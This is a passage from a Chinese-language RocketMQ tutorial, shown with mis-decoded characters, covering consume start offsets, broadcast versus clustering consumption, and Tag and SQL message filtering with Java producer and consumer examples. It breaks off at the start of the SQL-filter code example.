<p>Broker ç«¯é€šè¿‡ Consumer è¿”å›çš„çŠ¶æ€æ¥æ¨è¿›æ‰€å±æ¶ˆè´¹è€…ç»„å¯¹åº”çš„ Offsetã€‚RocketMQ å¯ä»¥è®©æ¶ˆè´¹è€…è‡ªè¡Œå®šä¹‰ï¼Œé€šè¿‡è®¾ç½® ConsumeFromWhere ä¸ ConsumeTimestamp æ¥è®¾ç½®æ¶ˆè´¹èµ·å§‹ä½ç½®ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(<span class="hljs-string">"group"</span>);

<span class="hljs-comment">// æ–¹æ³•1ï¼šä»æŒ‡å®šæ—¶é—´ç‚¹å¼€å§‹æ¶ˆè´¹</span>
consumer.setConsumeTimestamp(<span class="hljs-string">"20260101000000"</span>); <span class="hljs-comment">// æ ¼å¼ï¼šyyyyMMddHHmmss</span>

<span class="hljs-comment">// æ–¹æ³•2ï¼šæŒ‡å®šæ¶ˆè´¹èµ·å§‹ä½ç½®ç­–ç•¥</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET); <span class="hljs-comment">// ä»æœ€æ—©å¼€å§‹</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);   <span class="hljs-comment">// ä»æœ€æ–°å¼€å§‹</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_TIMESTAMP);    <span class="hljs-comment">// ä»æŒ‡å®šæ—¶é—´å¼€å§‹</span>
</code></pre>
<p>ConsumeFromWhereï¼šæ¶ˆè´¹ä½ç½®ç­–ç•¥æšä¸¾</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ConsumeFromWhere</span> {
    CONSUME_FROM_LAST_OFFSET,      <span class="hljs-comment">// ä»é˜Ÿåˆ—çš„ç¬¬â¼€æ¡æ¶ˆæ¯å¼€å§‹é‡æ–°æ¶ˆè´¹</span>
    CONSUME_FROM_FIRST_OFFSET,     <span class="hljs-comment">// ä»ä¸Šæ¬¡æ¶ˆè´¹åˆ°çš„åœ°â½…å¼€å§‹ç»§ç»­æ¶ˆè´¹</span>
    CONSUME_FROM_TIMESTAMP         <span class="hljs-comment">// ä»æŸâ¼€ä¸ªæ—¶é—´ç‚¹å¼€å§‹é‡æ–°æ¶ˆè´¹</span>
}
</code></pre>
<p>å¦‚æœé€šè¿‡æ—¶é—´ç‚¹æ¥æŒ‡å®šæ¶ˆè´¹ï¼Œéœ€è¦æŒ‡å®šæ—¶é—´ç‚¹ï¼Œè¿™ä¸ªæ—¶é—´ç‚¹çš„æ ¼å¼ï¼š<code>yyyyMMddHHmmss</code>ã€‚</p>
<h3 data-id="heading-14">3 å¹¿æ’­æ¶ˆæ¯</h3>
<p>åœ¨ rocketmq ä¸­ï¼Œä¸»è¦æœ‰ä¸¤ç§æ¶ˆæ¯çš„æ¶ˆè´¹æ¨¡å¼ï¼Œä¸€ç§æ˜¯é›†ç¾¤æ¶ˆè´¹ï¼Œå¦ä¸€ç§æ˜¯å¹¿æ’­æ¶ˆè´¹ã€‚</p>
<ol>
<li><strong>é›†ç¾¤æ¶ˆè´¹ï¼ˆClusteringï¼‰</strong>ï¼šé»˜è®¤æ¨¡å¼ã€‚åŒä¸€æ¡æ¶ˆæ¯åªä¼šè¢«<strong>åŒä¸€ä¸ªæ¶ˆè´¹è€…ç»„ï¼ˆConsumer Groupï¼‰</strong> ä¸­çš„<strong>ä¸€ä¸ª</strong>æ¶ˆè´¹è€…æ¶ˆè´¹ã€‚å…¶è®¾è®¡ç›®æ ‡æ˜¯å®ç°è´Ÿè½½å‡è¡¡å’Œé«˜å¯ç”¨ï¼Œå¤šä¸ªæ¶ˆè´¹è€…å…±åŒåˆ†æ‹…æ¶ˆæ¯å¤„ç†ä»»åŠ¡ã€‚</li>
<li><strong>å¹¿æ’­æ¶ˆè´¹ï¼ˆBroadcastingï¼‰</strong>ï¼šåŒä¸€æ¡æ¶ˆæ¯ä¼šè¢«<strong>åŒä¸€ä¸ªæ¶ˆè´¹è€…ç»„ä¸­çš„æ¯ä¸€ä¸ª</strong>æ¶ˆè´¹è€…æ¶ˆè´¹ä¸€æ¬¡ã€‚å…¶è®¾è®¡ç›®æ ‡æ˜¯è®©å¤šä¸ªè®¢é˜…è€…éƒ½æ¥æ”¶åˆ°å®Œæ•´çš„æ¶ˆæ¯æµã€‚</li>
</ol>
<p>é›†ç¾¤æ¨¡å¼ä¸‹ï¼Œâ¼€ä¸ªæ¶ˆæ¯ï¼Œåªä¼šè¢«â¼€ä¸ªæ¶ˆè´¹è€…ç»„ä¸­çš„å¤šä¸ªæ¶ˆè´¹è€…å®ä¾‹å…±åŒå¤„ç†â¼€æ¬¡ã€‚â¼´æ’­æ¨¡å¼ä¸‹ï¼Œâ¼€ä¸ªæ¶ˆæ¯ï¼Œåˆ™ä¼šæ¨é€ç»™æ‰€æœ‰æ¶ˆè´¹è€…å®ä¾‹å¤„ç†ï¼Œä¸å†å…³â¼¼æ¶ˆè´¹è€…ç»„ã€‚</p>
<h4 data-id="heading-15">3.1 ç®€å•ä»£ç </h4>
<p>JavaAPI ä»£ç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ï¼ï¼ï¼å…³é”®è®¾ç½®ï¼šå°†æ¶ˆè´¹æ¨¡å¼è®¾ç½®ä¸ºå¹¿æ’­æ¨¡å¼ ï¼ï¼ï¼</span>
consumer.setMessageModel(MessageModel.BROADCASTING);
</code></pre>
<p>æ¶ˆæ¯æ¨¡å‹æšä¸¾æœ‰ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯é›†ç¾¤å’Œå¹¿æ’­</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">MessageModel</span> {
    BROADCASTING(<span class="hljs-string">"BROADCASTING"</span>),
    CLUSTERING(<span class="hljs-string">"CLUSTERING"</span>);
    <span class="hljs-comment">// ....</span>
}
</code></pre>
<blockquote>
<p><strong>å®ç°æ€è·¯</strong></p>
<p>é»˜è®¤æ¨¡å¼(ä¹Ÿå°±æ˜¯é›†ç¾¤æ¨¡å¼)ä¸‹ï¼ŒBrokerç«¯ä¼šç»™æ¯ä¸ªConsumerGroupç»´æŠ¤â¼€ä¸ªç»Ÿâ¼€çš„Offsetï¼Œè¿™æ ·ï¼Œå½“Consumeræ¥æ‹‰å–æ¶ˆæ¯æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡Offsetä¿è¯â¼€ä¸ªæ¶ˆæ¯ï¼Œåœ¨åŒâ¼€ä¸ªConsumerGroupå†…åªä¼šè¢«æ¶ˆè´¹â¼€æ¬¡ã€‚â½½â¼´æ’­æ¨¡å¼çš„æœ¬è´¨ï¼Œæ˜¯å°†Offsetè½¬ç§»åˆ°Consumerç«¯â¾ƒâ¾ä¿ç®¡ï¼ŒåŒ…æ‹¬Offsetçš„è®°å½•ä»¥åŠæ›´æ–°ï¼Œå…¨éƒ½æ”¾åˆ°å®¢æˆ·ç«¯ã€‚è¿™æ ·Brokeræ¨é€æ¶ˆæ¯æ—¶ï¼Œå°±ä¸å†ç®¡ConsumerGroupï¼Œåªè¦Consumeræ¥æ‹‰å–æ¶ˆæ¯ï¼Œå°±è¿”å›å¯¹åº”çš„æ¶ˆæ¯ã€‚</p>
</blockquote>
<h4 data-id="heading-16">3.2 å·¥ä½œåŸç†</h4>
<p>å‡è®¾ä½ æœ‰ä¸€ä¸ªæ¶ˆè´¹è€…ç»„ <code>MyConsumerGroup</code>ï¼Œå®ƒä¸‹é¢æœ‰ä¸‰ä¸ªæ¶ˆè´¹è€…å®ä¾‹ <code>C1</code>ï¼Œ <code>C2</code>ï¼Œ <code>C3</code>ï¼Œå®ƒä»¬éƒ½è®¢é˜…äº†ä¸»é¢˜ <code>MyTopic</code>ã€‚</p>
<ul>
<li><strong>åœ¨é›†ç¾¤æ¨¡å¼ä¸‹</strong>ï¼šä¸»é¢˜ <code>MyTopic</code> ä¸‹çš„10æ¡æ¶ˆæ¯ä¼šä»¥è´Ÿè½½å‡è¡¡çš„æ–¹å¼ï¼ˆé»˜è®¤ä¸ºè½®è¯¢ï¼‰å¹³å‡åˆ†é…ç»™ <code>C1</code>ï¼Œ <code>C2</code>ï¼Œ <code>C3</code> æ¶ˆè´¹ã€‚æ¯ä¸ªæ¶ˆæ¯åªä¼šè¢«å…¶ä¸­ä¸€ä¸ªå®ä¾‹æ¶ˆè´¹ã€‚</li>
<li><strong>åœ¨å¹¿æ’­æ¨¡å¼ä¸‹</strong>ï¼šä¸»é¢˜ <code>MyTopic</code> ä¸‹çš„æ¯ä¸€æ¡æ¶ˆæ¯ï¼Œéƒ½ä¼šå®Œæ•´åœ°å‘é€ç»™ <code>C1</code>ï¼Œ <code>C2</code>ï¼Œ <code>C3</code> <strong>å„ä¸€ä»½</strong>ã€‚æ¯ä¸ªæ¶ˆè´¹è€…å®ä¾‹éƒ½ä¼šç‹¬ç«‹æ¶ˆè´¹è¿™10æ¡æ¶ˆæ¯ã€‚</li>
</ul>
<pre><code class="hljs language-java" lang="java">é›†ç¾¤æ¨¡å¼ (è´Ÿè½½å‡è¡¡)        å¹¿æ’­æ¨¡å¼ (å…¨é‡å¤åˆ¶)
  Msg1 -&gt; [C1]                Msg1 -&gt; [C1]
  Msg2 -&gt; [C2]                Msg2 -&gt; [C1]
  Msg3 -&gt; [C3]      VS        Msg3 -&gt; [C1]
  Msg4 -&gt; [C1]                ... (ä»¥æ­¤ç±»æ¨ï¼Œæ¯æ¡æ¶ˆæ¯)
                              Msg1 -&gt; [C2]
                              Msg2 -&gt; [C2]
                              ...
                              Msg1 -&gt; [C3]
                              Msg2 -&gt; [C3]
                              ...
</code></pre>
<h4 data-id="heading-17">3.3 æ³¨æ„äº‹é¡¹</h4>
<ol>
<li><strong>æ¶ˆè´¹è¿›åº¦ï¼ˆOffsetï¼‰ç®¡ç†</strong>ï¼š
<ul>
<li><strong>é›†ç¾¤æ¨¡å¼</strong>ï¼šæ¶ˆè´¹è¿›åº¦ç”±Brokerç«¯é›†ä¸­å­˜å‚¨å’Œç®¡ç†ï¼ˆæ–°ç‰ˆï¼‰ï¼Œæ‰€æœ‰æ¶ˆè´¹è€…å®ä¾‹å…±äº«åŒä¸€ä»½è¿›åº¦ã€‚å¦‚æœ <code>C1</code> æ¶ˆè´¹äº† <code>Msg1</code>ï¼Œæ•´ä¸ªç»„å°±è®¤ä¸º <code>Msg1</code> å·²è¢«æ¶ˆè´¹ã€‚</li>
<li><strong>å¹¿æ’­æ¨¡å¼</strong>ï¼š<strong>æ¶ˆè´¹è¿›åº¦å­˜å‚¨åœ¨æ¶ˆè´¹è€…å®ä¾‹æœ¬åœ°</strong>ï¼ˆä¾‹å¦‚æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼‰ã€‚æ¯ä¸ªå®ä¾‹ç‹¬ç«‹ç»´æŠ¤è‡ªå·±çš„æ¶ˆè´¹è¿›åº¦ï¼Œäº’ä¸å½±å“ã€‚<code>C1</code> æ¶ˆè´¹åˆ°å“ªé‡Œï¼Œä¸ <code>C2</code>ã€<code>C3</code> å®Œå…¨æ— å…³ã€‚è¿™æ„å‘³ç€å¦‚æœ <code>C1</code> å®ä¾‹é‡å¯ï¼Œå®ƒä¼šä»è‡ªå·±æœ¬åœ°çš„è®°å½•å¼€å§‹æ¶ˆè´¹ï¼Œè€Œä¸ä¼šä»å…¶ä»–å®ä¾‹çš„è¿›åº¦ç»§ç»­ã€‚</li>
</ul>
</li>
<li><strong>èµ„æºæ¶ˆè€—ä¸æ€§èƒ½</strong>ï¼š
<ul>
<li>å¹¿æ’­æ¨¡å¼ä¸‹ï¼Œç½‘ç»œæµé‡å’ŒBrokerçš„è´Ÿè½½ä¼šæˆå€å¢åŠ ï¼ˆä¸æ¶ˆè´¹è€…å®ä¾‹æ•°é‡æˆæ­£æ¯”ï¼‰ã€‚å‡è®¾æœ‰Nä¸ªå®ä¾‹ï¼Œæ¯æ¡æ¶ˆæ¯ç†è®ºä¸Šä¼šè¢«ä¼ è¾“Næ¬¡ã€‚</li>
<li>æ¯ä¸ªæ¶ˆè´¹è€…å®ä¾‹éƒ½è¦å¤„ç†å…¨é‡æ¶ˆæ¯ï¼Œå¯¹ä¸‹æ¸¸ä¸šåŠ¡ç³»ç»Ÿï¼ˆå¦‚æ•°æ®åº“ï¼‰å¯èƒ½é€ æˆé‡å¤å†™å…¥å‹åŠ›ï¼Œéœ€è¦ä¸šåŠ¡æ–¹è‡ªå·±å¤„ç†å¹‚ç­‰æ€§ã€‚</li>
</ul>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š
<ul>
<li><strong>ç¼“å­˜åˆ·æ–°/åŒæ­¥</strong>ï¼šå¤šä¸ªåº”ç”¨æœåŠ¡å™¨å®ä¾‹éœ€è¦åŒæ—¶åˆ·æ–°æœ¬åœ°ç¼“å­˜ï¼ˆå¦‚å•†å“ä¿¡æ¯å˜æ›´ã€é…ç½®æ›´æ–°ï¼‰ã€‚</li>
<li><strong>äº‹ä»¶é€šçŸ¥</strong>ï¼šä¸€ä¸ªäº‹ä»¶éœ€è¦è§¦å‘æ‰€æœ‰å¾®æœåŠ¡å®ä¾‹çš„æŸä¸ªåŠ¨ä½œï¼ˆå¦‚æ—¥å¿—æ¸…ç†ã€è¿æ¥é‡ç½®ï¼‰ã€‚</li>
<li><strong>æ•°æ®é•œåƒ</strong>ï¼šå¤šä¸ªå¼‚åœ°ç³»ç»Ÿéœ€è¦ç»´æŠ¤ä¸€ä»½ç›¸åŒçš„æ•°æ®å‰¯æœ¬ã€‚</li>
</ul>
</li>
<li><strong>ä¸é€‚ç”¨åœºæ™¯</strong>ï¼š
<ul>
<li><strong>éœ€è¦è´Ÿè½½åˆ†æ‹…å¤„ç†å¤§é‡æ¶ˆæ¯</strong>çš„åœºæ™¯ï¼ˆå¦‚è®¢å•å¤„ç†ã€æ—¥å¿—æ”¶é›†ï¼‰ã€‚æ­¤æ—¶åº”ä½¿ç”¨é›†ç¾¤æ¨¡å¼ã€‚</li>
<li>å¯¹æ¶ˆæ¯å¤„ç†æœ‰ä¸¥æ ¼çš„â€œåªå¤„ç†ä¸€æ¬¡â€è¦æ±‚ï¼Œä¸”ä¸å¸Œæœ›ä¸šåŠ¡å±‚åšå¤æ‚å¹‚ç­‰å¤„ç†çš„åœºæ™¯ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-18">4 è¿‡æ»¤æ¶ˆæ¯</h3>
<p>RocketMQ çš„è¿‡æ»¤æ¶ˆæ¯åŠŸèƒ½å…è®¸æ¶ˆè´¹è€…åªæ¥æ”¶å…¶æ„Ÿå…´è¶£çš„æ¶ˆæ¯ï¼Œè€Œä¸æ˜¯è®¢é˜…ä¸»é¢˜ä¸‹çš„æ‰€æœ‰æ¶ˆæ¯ã€‚è¿™åœ¨å¤šç§æ¶ˆè´¹è€…å¯¹åŒä¸€ä¸»é¢˜æœ‰ä¸åŒå…³æ³¨ç‚¹çš„åœºæ™¯ä¸‹éå¸¸æœ‰ç”¨ã€‚</p>
<blockquote>
<p>å½“æˆ‘ä»¬ç›¸åŒçš„æ¨¡å—çš„æ¶ˆæ¯éƒ½æ”¾åˆ°åŒä¸€ä¸ª Topic ä¸­ï¼Œä½†æ˜¯ä¸åŒçš„ä¸šåŠ¡éœ€è¦æ ¹æ®ä¸åŒçš„éœ€æ±‚å»è·å–ä¸åŒçš„æ¶ˆæ¯ã€‚ä¾‹å¦‚ä»“å‚¨ç³»ç»Ÿï¼Œå…¥åº“å‡ºåº“æ¶ˆæ¯éƒ½æ˜¯åœ¨ä»“å‚¨çš„ Topic ä¸­ï¼Œä»“å‚¨ç³»ç»Ÿéœ€è¦è®°è´¦ï¼Œå°±æ ¹æ®æ‰€éœ€çš„æ¶ˆæ¯å»åšè¿›è´¦ä¸å‡ºè´¦ä¸šåŠ¡ã€‚</p>
</blockquote>
<p>RocketMQ çš„æ¶ˆæ¯è¿‡æ»¤æ˜¯åœ¨ Broker ç«¯æ‰§è¡Œçš„æ ¸å¿ƒæœºåˆ¶ï¼Œæ ¸å¿ƒæ˜¯é€šè¿‡Tag æ ‡ç­¾è¿‡æ»¤å’ŒSQL92 å±æ€§è¿‡æ»¤ä¸¤ç§æ–¹å¼ï¼Œè®©æ¶ˆè´¹è€…åªæ¥æ”¶ç¬¦åˆæ¡ä»¶çš„æ¶ˆæ¯ï¼Œå‡å°‘æ— æ•ˆç½‘ç»œä¼ è¾“ä¸æ¶ˆè´¹ç«¯å‹åŠ›ï¼Œè¿‡æ»¤åœ¨æœåŠ¡ç«¯å®Œæˆï¼Œéµå¾ª â€œåŒ¹é…å³æŠ•é€’â€ åŸåˆ™ã€‚</p>
<h4 data-id="heading-19">4.1 Tag è¿‡æ»¤</h4>
<p>åŸºäºæ¶ˆæ¯çš„ Tag æ ‡ç­¾è¿›è¡Œè¿‡æ»¤ï¼ŒTag æ˜¯æ¶ˆæ¯çš„å­åˆ†ç±»æ ‡è¯†ï¼Œæ¯ä¸ªæ¶ˆæ¯åªèƒ½æœ‰ä¸€ä¸ª Tagã€‚</p>
<p><strong>è¯­æ³•è§„åˆ™</strong></p>
<ul>
<li>å• Tag åŒ¹é…ï¼šå¦‚ "CREATE"ï¼Œåªæ¥æ”¶æ ‡ç­¾ä¸º CREATE çš„æ¶ˆæ¯ã€‚</li>
<li>å¤š Tag åŒ¹é…ï¼šå¤šä¸ª Tag é—´ç”¨ <code>||</code> åˆ†éš”ï¼ˆé€»è¾‘æˆ–ï¼‰ï¼Œå¦‚ "CREATE||PAY||CANCEL"ã€‚ï¼ˆä¸æ”¯æŒæ¨¡ç³ŠåŒ¹é…ï¼‰</li>
<li>å…¨åŒ¹é…ï¼šç”¨ <code>*</code> è¡¨ç¤ºæ¥æ”¶è¯¥ä¸»é¢˜ä¸‹æ‰€æœ‰æ¶ˆæ¯ã€‚</li>
</ul>
<p><strong>å®ç°åŸç†</strong></p>
<ol>
<li>ç”Ÿäº§è€…å‘é€æ¶ˆæ¯æ—¶ï¼ŒTag ä¼šè¢«è®¡ç®—å“ˆå¸Œå€¼å­˜å…¥ ConsumeQueueï¼ˆæ¶ˆæ¯æ¶ˆè´¹é€»è¾‘é˜Ÿåˆ—ï¼‰ã€‚</li>
<li>Broker è¿‡æ»¤æ—¶å…ˆé€šè¿‡ ConsumeQueue ä¸­çš„ Tag å“ˆå¸Œå€¼å¿«é€ŸåŒ¹é…ï¼Œå‘½ä¸­åå†æ ¡éªŒæ¶ˆæ¯åŸå§‹ Tag å­—ç¬¦ä¸²ï¼Œé¿å…å“ˆå¸Œå†²çªå¯¼è‡´è¯¯åŒ¹é…ã€‚</li>
<li>æ¶ˆè´¹ç«¯æ‹‰å–åˆ°æ¶ˆæ¯åï¼Œä¹Ÿä¼šäºŒæ¬¡æ ¡éªŒ Tag åŸå§‹å€¼ï¼Œç¡®ä¿è¿‡æ»¤å‡†ç¡®æ€§ã€‚</li>
</ol>
<p><strong>ä»£ç æ¡ˆä¾‹</strong></p>
<p>ç”Ÿäº§è€…ï¼Œå‘ Topic æ˜¯ <code>TopicTest</code> å‘é€ TagAã€TagBã€TagC ä¸‰ç§æ ‡ç­¾çš„æ¶ˆæ¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TagFilterProducer</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; TAGS = List.of(<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
        <span class="hljs-comment">// åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„</span>
        <span class="hljs-type">DefaultMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQProducer</span>(PRODUCER_GROUP);
        <span class="hljs-comment">// è®¾ç½®Nameserveråœ°å€</span>
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// å¯åŠ¨ç”Ÿäº§è€…</span>
        producer.start();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// åˆ›å»ºæ¶ˆæ¯ä½“ï¼šè®¢é˜…ä¸»é¢˜ã€Tagã€æ¶ˆæ¯ä½“</span>
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC,
                        TAGS.get(i % TAGS.size()),
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );
                <span class="hljs-comment">// å‘é€æ¶ˆæ¯</span>
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(msg, <span class="hljs-number">20</span> * <span class="hljs-number">1000</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                e.printStackTrace();
                Thread.sleep(<span class="hljs-number">1000</span>);
            }
        }
        <span class="hljs-comment">// å…³é—­ç”Ÿäº§è€…ï¼Œé‡Šæ”¾èµ„æº</span>
        producer.shutdown();
    }
}
</code></pre>
<p><strong>è¿‡æ»¤æ¶ˆè´¹è€…</strong></p>
<p>é€šè¿‡æŒ‡å®š Tag è§„åˆ™è¿›è¡Œè¿‡æ»¤ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TagFilterConsumer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONSUMER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException {
        <span class="hljs-comment">// åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„</span>
        <span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(CONSUMER_GROUP);
        <span class="hljs-comment">// è®¾ç½®Nameserveråœ°å€</span>
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// å¦‚æœç‰¹å®šçš„æ¶ˆè´¹ç¾¤ä½“æ˜¯å…¨æ–°çš„ï¼Œè¯·æŒ‡å®šä»å“ªé‡Œå¼€å§‹</span>
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);
        <span class="hljs-comment">// é…ç½®è®¢é˜…ä¸»é¢˜Topicã€Tag</span>
<span class="hljs-comment">//        consumer.subscribe(TOPIC, "*");</span>
<span class="hljs-comment">//        consumer.subscribe(TOPIC, "TagA");</span>
        consumer.subscribe(TOPIC, <span class="hljs-string">"TagA || TagB"</span>);
        <span class="hljs-comment">// è®¾ç½®å›è°ƒå‡½æ•°ï¼Œå¤„ç†æ¶ˆæ¯</span>
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msg);
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });
        <span class="hljs-comment">// å¯åŠ¨æ¶ˆè´¹è€…ï¼Œå¯åŠ¨åä¼šä¸€ç›´æŒ‚ç€ï¼ŒæŒç»­å¤„ç†æ¶ˆæ¯</span>
        consumer.start();
        System.out.printf(<span class="hljs-string">"Consumer Started.%n"</span>);
    }
}
</code></pre>
<p>è¿‡æ»¤å¯ä»¥è·å–å…¨éƒ¨çš„æ¶ˆæ¯ã€æŒ‡å®šå•ä¸ªçš„ Tag æˆ–è€…æŒ‡å®šå¤šä¸ª Tagã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é€šé…</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"*"</span>);
<span class="hljs-comment">// å•ä¸ª</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"TagA"</span>);
<span class="hljs-comment">// å¤šä¸ª</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"TagA || TagB"</span>);
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šç®€å•çš„æ¶ˆæ¯åˆ†ç±»è¿‡æ»¤ï¼Œå¦‚è®¢å•åˆ›å»ºã€æ”¯ä»˜ã€å–æ¶ˆç­‰ä¸åŒç±»å‹æ¶ˆæ¯çš„åˆ†ç¦»ï¼Œé€‚åˆé«˜ååé‡åœºæ™¯ï¼Œæ€§èƒ½æŸè€—ä½ã€‚</p>
<h4 data-id="heading-20">4.2 SQL è¿‡æ»¤</h4>
<p>SQL è¿‡æ»¤æ˜¯åŸºäºæ¶ˆæ¯çš„è‡ªå®šä¹‰å±æ€§ï¼ˆkey-valueï¼‰è¿›è¡Œè¿‡æ»¤ï¼Œæ”¯æŒ SQL92 è¯­æ³•çš„å­é›†ï¼Œå¯å®ç°å¤æ‚æ¡ä»¶åŒ¹é…ï¼Œæ¯ä¸ªæ¶ˆæ¯å¯è®¾ç½®å¤šä¸ªå±æ€§<strong/>ã€‚</p>
<p><strong>æ”¯æŒè¯­æ³•å…ƒç´ </strong></p>
<ul>
<li>æ¯”è¾ƒè¿ç®—ç¬¦ï¼š<code>=</code>ã€<code>&lt;&gt;</code>ã€<code>&gt;</code>ã€<code>&gt;=</code>ã€<code>&lt;</code>ã€<code>&lt;=</code>ã€‚</li>
<li>é€»è¾‘è¿ç®—ç¬¦ï¼š<code>AND</code>ã€<code>OR</code>ã€<code>NOT</code>ã€‚</li>
<li>å¸¸é‡ï¼šå­—ç¬¦ä¸²ï¼ˆç”¨å•å¼•å·ï¼‰ã€æ•°å­—ã€<code>NULL</code>ã€‚</li>
<li>å‡½æ•°ï¼š<code>IN</code>ã€<code>LIKE</code>ã€<code>BETWEEN</code> ç­‰ã€‚</li>
<li>æ¨¡ç³ŠåŒ¹é…ï¼š<code>%</code> åŒ¹é…ä»»æ„ 0 ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼Œ <code>_</code> åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦  ã€‚</li>
</ul>
<p><strong>å®ç°åŸç†</strong>ï¼šä¾èµ– rocketmq-filter æ¨¡å—æ„å»ºå¹¶æ‰§è¡Œ SQL è¡¨è¾¾å¼ï¼Œè¿‡æ»¤æ—¶éœ€è¯»å–æ¶ˆæ¯çš„å®Œæ•´å±æ€§è¿›è¡Œè®¡ç®—ï¼Œæ€§èƒ½ç•¥ä½äº Tag è¿‡æ»¤ï¼Œä½†çµæ´»æ€§æ›´é«˜ã€‚</p>
<p>æ¡ˆä¾‹ä»£ç </p>
